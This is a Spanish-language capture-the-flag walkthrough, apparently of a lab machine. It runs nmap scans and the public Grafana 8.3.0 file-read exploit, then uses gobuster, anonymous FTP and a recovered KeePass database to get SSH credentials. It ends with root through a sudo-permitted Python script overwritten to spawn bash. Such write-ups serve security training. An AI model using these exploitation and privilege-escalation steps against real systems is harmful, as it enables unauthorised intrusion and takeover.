Haremos un escaneo de la ip para ver que puertos están abiertos y que servicios tiene asociados a ellos.
```
sudo nmap -sV -sC --min-rate 7000 -p- -Pn 10.10.11.253 -oN escaneo
```
![alt text](image.png)

Vemos que tenemos un servidor apache 2.4..58 corriendo en el puerto 80. Y un a aplicación web corriendo en el puerto 3000, así que vamos a ver que esconde esta.
![alt text](image-1.png)

Vemos a ver con la herramienta `wappalyzer` la versíon de esta aplicación web.
![alt text](image-2.png)

Vemos que la versión es `Grafana 8.3.0`, así que vamos a ver si tienen algun exploit.
```
searchsploit grafana 8.3.0
```
![alt text](image-3.png)

Vemos que tiene un exploit, así que vamos a buscarlo. 
```
Link: https://www.exploit-db.com/exploits/50581
```

Una vez lo tenemos descargado lo vamos a usar para leer archivos del servidor.
```
python3 50581.py -H http://172.17.0.2:3000
```
![alt text](image-4.png)

Al no saber que archivo buscar, vamos a hacer un fuzzing de la web para ver si podemos encontrar una pista.
```
gobuster dir -u http://172.17.0.2 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html
```
![alt text](image-5.png)

Vemos que nos da un archivo llamado `maintenance.html`, así que vamos a ver que esconde.
![alt text](image-6.png)

Vemos que nos da una ruta de un archivo, así que vamos a buscarlo.
```
/tmp/pass.txt
```
![alt text](image-7.png)

Vemos que nos da como una especie de password, así que nos lo vamos a guardar para más adelante. Ahora vamos a intentar entrar al servicio ftp con las claves por defecto.
```
ftp 172.17.0.2
user: anonymous
password: 
```
![alt text](image-8.png)

Vemos que hay una carpeta llamada mantenimiento, vamos a ver que nos esconde.
![alt text](image-9.png)

Vemos que hay un archivo llamado `database.kdbx`. Esta extension corresponde a un keepass (aplicaciones para guardar contraseñas.), vamos a descargarlo para poderlo ejecutar.
```
get database.kdbx
```
![alt text](image-10.png)

Una vez descargado vamos a abririrlo.
```
keepass2 database.kdbx
```
![alt text](image-11.png)

Vemos que esto nos mustra como una especie de login.
![alt text](image-12.png)

Este nos pide una contraseña, así que vamos a probar con las password que hemos sacado antes. Vemos que nos lo ha aceptado y nos muestra un usuario junto a una contraseña.
![alt text](image-13.png)

Veamos que contraseña corresponde al usuario freddy.
![alt text](image-14.png)

Vamos a probar este usuario y esta password en el servicio ssh.
```
ssh freddy@172.17.0.2
password: t9sH76gpQ82UFeZ3GXZS
```
![alt text](image-15.png)

Vemos que ya estamos dentro, vamos a intentar conseguir los máximos privilegios. Para ello vamos a ver que binarios tinen los permisos de administrador.
```
sudo -l
```
![alt text](image-16.png)

Vemos que tenemos todos los privilegios en el binario python3 y a este se le permite ejecutar un archivo, así que vamos a modificar este.
```
echo "import os; os.system('/bin/bash');">/opt/maintenence.py
```
![alt text](image-17.png)

Ahora vamos a ejecutar el archivo junto al binario con los permisos de administrador para generarnos la shell de administrador.
```
sudo /usr/bin/python3 /opt/maintenence.py
```
![alt text](image-18.png)